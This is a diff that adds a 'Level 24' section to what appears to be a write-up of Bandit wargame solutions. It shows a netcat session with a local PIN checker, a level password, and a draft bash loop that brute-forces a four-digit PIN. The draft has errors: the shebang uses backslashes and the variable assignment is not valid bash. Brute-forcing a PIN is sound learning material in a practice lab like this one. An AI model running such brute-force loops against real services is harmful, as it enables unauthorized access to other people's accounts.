@@ -417,3 +417,23 @@ initscript.sh  pass24
 bandit23@bandit:/tmp/init723$ cat pass24
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 ```
+
+## Level 24
+
+```bsh
+bandit24@bandit:~$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode
+ on a single line, separated by a space.
+ ```
+ We need to brute force the four digit pin. Time for a bash script.
+
+#Work out how we filter the output
+
+ ```bsh
+ #!\bin\bash
+
+ for i in {0000..9999}
+ do
+    output = echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i | nc localhost 30002
+done
+```
